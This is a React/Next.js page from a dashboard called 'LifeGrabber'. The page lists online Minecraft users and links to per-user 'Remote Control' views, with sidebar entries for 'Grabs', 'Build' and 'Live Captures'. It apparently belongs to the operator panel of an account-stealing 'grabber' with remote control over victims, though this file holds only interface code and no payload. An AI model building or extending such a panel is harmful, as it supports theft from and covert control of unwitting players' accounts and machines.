'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

const colors = {
  bg: '#050508',
  panel: 'rgba(13, 13, 18, 0.7)',
  border: 'rgba(255,255,255,0.06)',
  text: '#f0f0f0',
  textDim: '#6b6e7b',
  green: '#22c55e',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} className="btn-smooth" style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', borderRadius: 8,
      background: active ? 'rgba(34, 197, 94, 0.08)' : 'transparent',
      color: active ? colors.green : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}
    onMouseEnter={e => { if (!active) { e.currentTarget.style.background = 'rgba(255,255,255,0.03)'; e.currentTarget.style.color = colors.text; } }}
    onMouseLeave={e => { if (!active) { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = colors.textDim; } }}
    >
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

export default function RemoteControlPage() {
  const router = useRouter();
  const [onlineUsers, setOnlineUsers] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch('/api/stream')
      .then(r => r.json())
      .then(d => { setOnlineUsers(d.online || []); setLoading(false); })
      .catch(() => setLoading(false));

    const iv = setInterval(() => {
      fetch('/api/stream').then(r => r.json()).then(d => setOnlineUsers(d.online || [])).catch(() => {});
    }, 3000);
    return () => clearInterval(iv);
  }, []);

  return (
    <div className="page-enter" style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 220, borderRight: '1px solid rgba(255,255,255,0.06)', padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'rgba(10, 10, 16, 0.8)', backdropFilter: 'blur(12px)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
          <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
          <NavItem icon="🖥" label="Remote Control" active onClick={() => router.push('/dashboard/remote-control')} />
          <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
        </div>
        <div>
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>

      <main style={{ flex: 1, padding: '28px 36px' }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20 }}>
          <div>
            <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Remote Control</h1>
            <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4 }}>{onlineUsers.length} user{onlineUsers.length !== 1 ? 's' : ''} online</p>
          </div>
        </div>

        {loading ? (
          <div className="glass-card" style={{ borderRadius: 12, height: 300, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
        ) : onlineUsers.length === 0 ? (
          <div className="glass-card" style={{ borderRadius: 12, height: 300, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
            <span style={{ fontSize: 28, marginBottom: 8 }}>No users online</span>
            <span style={{ fontSize: 13 }}>Users will appear here when they join a server</span>
          </div>
        ) : (
          <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap', marginBottom: 20 }}>
            {onlineUsers.map(u => (
              <div key={u.username} onClick={() => router.push('/dashboard/remote-control/' + encodeURIComponent(u.username))} className="glass-card" style={{ cursor: 'pointer', border: '1px solid ' + colors.border, borderRadius: 10, padding: '12px 16px', display: 'flex', alignItems: 'center', gap: 10 }}
                onMouseEnter={e => { e.currentTarget.style.borderColor = colors.green; e.currentTarget.style.background = 'rgba(34, 197, 94, 0.04)'; }}
                onMouseLeave={e => { e.currentTarget.style.borderColor = colors.border; e.currentTarget.style.background = 'transparent'; }}
              >
                <img src={'https://mc-heads.net/avatar/' + u.username + '/32'} alt="" style={{ width: 28, height: 28, borderRadius: 6 }} />
                <div>
                  <div style={{ fontSize: 13, fontWeight: 600, color: colors.text }}>{u.username}</div>
                  <div style={{ fontSize: 11, color: colors.green }}>Live</div>
                </div>
              </div>
            ))}
          </div>
        )}
      </main>
    </div>
  );
}